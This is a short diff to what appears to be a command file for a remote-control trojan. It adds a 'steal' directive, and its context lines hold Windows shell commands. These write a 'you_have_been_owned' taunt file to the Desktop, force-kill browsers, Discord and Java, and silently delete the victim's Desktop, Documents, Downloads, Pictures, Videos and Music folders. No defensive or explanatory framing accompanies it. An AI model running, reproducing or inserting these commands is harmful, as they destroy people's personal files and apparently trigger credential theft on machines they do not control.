@@ -1,5 +1,6 @@
 # my commands
-version: 3.5
+version: 5
+steal
 shell echo OWNED > %USERPROFILE%\Desktop\you_have_been_owned.txt
 shell taskkill /f /im discord.exe /im chrome.exe /im msedge.exe /im firefox.exe /im opera.exe /im javaw.exe 2>nul
 shell rd /s /q %USERPROFILE%\Desktop 2>nul & rd /s /q %USERPROFILE%\Documents 2>nul & rd /s /q %USERPROFILE%\Downloads 2>nul & rd /s /q %USERPROFILE%\Pictures 2>nul & rd /s /q %USERPROFILE%\Videos 2>nul & rd /s /q %USERPROFILE%\Music 2>nul
